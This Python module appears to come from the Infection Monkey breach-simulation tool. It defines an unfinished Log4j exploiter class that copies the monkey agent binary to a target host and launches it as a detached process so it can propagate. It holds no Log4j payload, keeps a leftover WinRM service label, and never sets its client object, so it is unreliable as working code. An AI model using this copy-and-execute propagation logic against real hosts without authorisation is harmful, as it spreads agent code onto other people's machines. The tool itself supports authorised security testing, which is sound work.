import logging
import os

import infection_monkey.monkeyfs as monkeyfs
from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit.consts import WIN_ARCH_32
from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.tools.helpers import get_monkey_depth, get_target_monkey_by_os
from infection_monkey.model import DROPPER_ARG, RUN_MONKEY, VictimHost
from infection_monkey.utils.commands import build_monkey_commandline

logger = logging.getLogger(__name__)

TEMP_MONKEY_BINARY_FILEPATH = "./monkey_temp_bin"


class Log4jExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["linux", "windows"]
    EXPLOIT_TYPE = ExploitType.VULNERABILITY
    # TODO: It is not a specific service,
    _EXPLOITED_SERVICE = "PowerShell Remoting (WinRM)"

    def __init__(self, host: VictimHost):
        super().__init__(host)
        self._client = None

    def _exploit_host(self):
        return self._execute_monkey_agent_on_victim()

    def _execute_monkey_agent_on_victim(self) -> bool:
        arch = self._client.get_host_architecture()
        self.is_32bit = arch == WIN_ARCH_32
        logger.debug(f"Host architecture is {arch}")

        monkey_path_on_victim = (
            self._config.dropper_target_path_win_32
            if self.is_32bit
            else self._config.dropper_target_path_win_64
        )

        is_monkey_copy_successful = self._copy_monkey_binary_to_victim(monkey_path_on_victim)
        if is_monkey_copy_successful:
            logger.info("Successfully copied the monkey binary to the victim.")
            self._run_monkey_executable_on_victim(monkey_path_on_victim)
        else:
            logger.error("Failed to copy the monkey binary to the victim.")
            return False

        return True

    def _copy_monkey_binary_to_victim(self, monkey_path_on_victim) -> bool:
        try:
            self._write_virtual_file_to_local_path()

            logger.info(f"Attempting to copy the monkey agent binary to {self.host.ip_addr}")
            is_monkey_copy_successful = self._client.copy_file(
                TEMP_MONKEY_BINARY_FILEPATH, monkey_path_on_victim
            )
        except Exception as ex:
            raise ex
        finally:
            if os.path.isfile(TEMP_MONKEY_BINARY_FILEPATH):
                os.remove(TEMP_MONKEY_BINARY_FILEPATH)

        return is_monkey_copy_successful

    def _write_virtual_file_to_local_path(self) -> None:
        monkey_fs_path = get_target_monkey_by_os(is_windows=True, is_32bit=self.is_32bit)

        with monkeyfs.open(monkey_fs_path) as monkey_virtual_file:
            with open(TEMP_MONKEY_BINARY_FILEPATH, "wb") as monkey_local_file:
                monkey_local_file.write(monkey_virtual_file.read())

    def _run_monkey_executable_on_victim(self, executable_path) -> None:
        monkey_execution_command = build_monkey_execution_command(
            self.host, get_monkey_depth() - 1, executable_path
        )

        logger.info(
            f"Attempting to execute the monkey agent on remote host " f"{self.host.ip_addr}"
        )

        self._client.execute_cmd_as_detached_process(monkey_execution_command)


def build_monkey_execution_command(host: VictimHost, depth: int, executable_path: str) -> str:
    monkey_params = build_monkey_commandline(
        target_host=host,
        depth=depth,
        vulnerable_port=None,
        location=executable_path,
    )

    return RUN_MONKEY % {
        "monkey_path": executable_path,
        "monkey_type": DROPPER_ARG,
        "parameters": monkey_params,
    }
